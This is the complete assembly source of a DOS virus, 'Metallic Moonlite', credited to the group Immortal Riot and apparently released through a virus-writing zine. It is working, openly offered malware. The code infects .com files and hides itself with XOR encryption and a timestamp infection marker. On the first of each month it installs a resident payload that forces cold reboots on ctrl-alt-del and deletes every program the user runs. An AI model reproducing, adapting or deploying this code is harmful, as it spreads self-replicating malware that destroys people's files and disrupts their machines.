; Virusname  : Metallic Moonlite
; Virusauthor: Metal Militia
; Virusgroup : Immortal Riot
; Origin     : Sweden
;
; It's a non-resident, current dir infector of com-files. every first
; of any month it will put a bit of code resident to make ctrl-alt-del's
; to coldboots and delete all files being executed. It's encrypted with
; an XOR-loop. If it's not the first it will simple make a screen-clear.
; Um!.. well, enjoy Insane Reality issue #4!
;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;			  METALLIC MOONLITE
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

.model tiny
.code
cseg    segment
        assume  cs:cseg,ds:cseg,es:cseg,ss:cseg
        org     100h
begin:
dummy_host      db      0e9h,00h,00h ; the jmp code
virus_start:
        mov     bp,0000h        ; the delta offset

        call    encrypt_decrypt ; call to unencrypt
        jmp     restore_old_bytes ; restore old first bytes

write_virus:
        call    encrypt_decrypt   ; call encryption routine

        lea dx,[bp+virus_start]   ; from 100h (start)
        mov cx,heap-virus_start   ; viruslength
        mov ah,40h                ; write it
        int 21h

        call encrypt_decrypt      ; once again, encryption routine
                                  ; being called
        ret                       ; ret(urn) to "caller"

        enc_val dw 0              ; encryption value storage

encrypt_decrypt:
        mov dx,word ptr [bp+enc_val] ; the encryption routine
        lea si,[bp+restore_old_bytes]
        mov cx,(heap_end-virus_start+1)/2
again:
        xor word ptr [si],dx         ; a simple XOR thang
        inc si                       ; but gaak!, so effective
        inc si
        loop again
        ret

restore_old_bytes:
        mov     di,0100h
        lea     si,[bp+old_bytes]       ; restore old first bytes
        movsw
        movsb

        lea     dx,[bp+new_dta]         ; DTA's place
        mov     ah,1Ah                  ; set it
        int     21h

        lea     dx,[bp+com_mask]        ; file(s) to find
        mov     cx,0002h                ; hidden/normal attributes
        mov     ah,4eh                  ; find first file
find_next:
        int     21h
        jnc     check_file              ; found one? if so, check it
        jmp     bye_bye                 ; no uninfected files found,
                                        ; outa here
check_file:
        mov     ax,word ptr [bp+file_time] ; get time of file
        and     al,00011111b            ; mask seconds field
        cmp     al,00010101b            ; check for previous infection
        je      try_again               ; is it infected? so, try another
        jmp     replicate               ; not infected yet, kick it

try_again:
        mov     ah,4fh ; find next file
        jmp     short find_next ; so, do that

replicate:
        lea     dx,[bp+file_name]
        sub     cx,cx
        mov     ax,4301h                ; set attributes
        int     21h

        lea     dx,[bp+file_name]       ; open file
        mov     ax,3d02h                ; read/write access
        int     21h
        xchg    ax,bx                   ; mov bx,ax

        mov     ah,3fh ; read bytes
        mov     cx,03h ; 3 of them
        lea     dx,[bp+old_bytes] ; save them in the buffer (old_bytes)
        int     21h

        cwd
        sub     cx,cx
        mov     ax,4202h                ; move file pointer to EOF
        int     21h

        sub     ax,03h                  ; 3 bytes
        mov     word ptr [bp+virus_start+1],ax ; from start
        mov     word ptr [bp+new_bytes+1],ax ; our jmp code

        mov     ah,2ch                       ; get time
        int     21h
        mov     word ptr [bp+enc_val],dx     ; put as encryption value
        call    write_virus                  ; write our code (*.*)

        cwd
        sub     cx,cx
        mov     ax,4200h                ; move file pointer to SOF
        int     21h

        lea     dx,[bp+new_bytes] ; write our jmp code at beginning
        mov     cx,03h ; 3 bytes long
        mov     ah,40h ; kick it
        int     21h

        mov     dx,word ptr [bp+file_date]
        mov     cx,word ptr [bp+file_time]
        and     cl,11100000b
        or      cl,00010101b
        mov     ax,5701h                ; restore date and time
        int     21h                     ; and mask seconds to show
                                        ; it's infected
        mov     ah,3eh                  ; close file
        int     21h

        lea     dx,[bp+file_name]
        sub     cx,cx
        mov     cl,byte ptr [bp+file_attr]
        mov     ax,4301h                ; restore the original attributes
        int     21h

        jmp     try_again               ; try to find another file

bye_bye:
        mov     ah,2ah                  ; get date
        int     21h
        cmp     dl,1                    ; the first of any month?
        je      print_it                ; if so, deletion time
        jmp     nofuckup                ; else, quit
print_it:
        mov     ah,9h                   ; print note
        lea     dx,[bp+offset printfake] ; faked thing
        int     21h

        jmp     resident                 ; go resident

int_9_entry   proc    far
        push    ax
        in      al,60h
        cmp     al,delcode               ; ctrl-alt-del?
        je      warmboot                 ; if so, boot
        pop     ax
        jmp     cs:Old_9                 ; let them use the old one
warmboot:
        db      0eah,00h,00h,0ffh,0ffh   ; no warmboot, but a coldboot
        iret                             ; i wonder if they will notice
int_9_entry   endp                       ; thatone (?)

int_21h_entry   proc    far
        cmp     ax,4b00h ; are they running a file?
        jne     go_on    ; if not, check other thang
        mov     ah,41h ; delete it
        int     21h
go_on:
        cmp     ax,4B9Fh ; is another copy trying to go resident?
        je      loc_0111 ; if so, show that we're here already
        jmp     cs:Old_21 ; else, let them use old int21
loc_0111:
        mov     ax,1994h ; 1994, our TSR mark here
        iret             ; to show that one copy's already eating memory
int_21h_entry	endp
en:
  
resident:
        mov     ax,3509h ; hook int9 (to read keyboard)
        int     21h

        mov     word ptr cs:Old_9,bx ; save the old one here
        mov     word ptr cs:Old_9+2,es
        mov     ax,2509h
        mov     dx,offset int_9_entry ; and use ours instead
        int     21h

        mov     ax,3521h ; hook int21 too (for filedeletion)
        int     21h

        mov     word ptr cs:Old_21,bx ; save old int21 here
	mov	word ptr cs:Old_21+2,es
	mov	ax,2521h
        mov     dx,offset int_21h_entry ; and let ours be used instead
        int     21h

        mov     dx,offset en            ; what to put resident
        int     27h                     ; do it

nofuckup:
;       mov     ah,0fh ; remove the first ";"
;       int     10h    ; and a screen-clear
;       mov     ah,0   ; will occure every
;       int     10h    ; execution.


restore_it_all:
        jmp     restore_dir ; restore everything

restore_dir:
        mov     ah,1ah                  ; restore DTA
        mov     dx,80h                  ; right now
        int     21h

        mov     ax,0100h                ; set ax to start
        push    ax                      ; push it
        retn                            ; back to original program

virusname       db      'Metallic Moonlite' ; virus name
copyright       db      '(c) Metal Militia/Immortal Riot' ; virus author
greetings       db      'Greetings to The Unforgiven/IR'
printfake       db      'Bad command or filename$'

com_mask        db      '*.com',0 ; files to infect, .com(mand)
old_bytes       db      0cdh,20h,90h ; old jmp saved here
new_bytes       db      0e9h,00h,00h ; new jmp code here
delcode         equ     53h ; ctrl-alt-del code(s)

heap:
old_9   dd      0 ; save's old int9 here
old_21  dd      0 ; save's old int21 aswell
new_dta         db      21 dup(?) ; the new DTA
file_attr       db      ? ; files attributes
file_time       dw      ? ; files time
file_date       dw      ? ; files date
file_size       dd      ? ; files size
file_name       db      13 dup(?) ; files name
old_attrs       db      5 dup(?) ; files old attributes
heap_end: ; eov (end of virus)
cseg    ends
        end     begin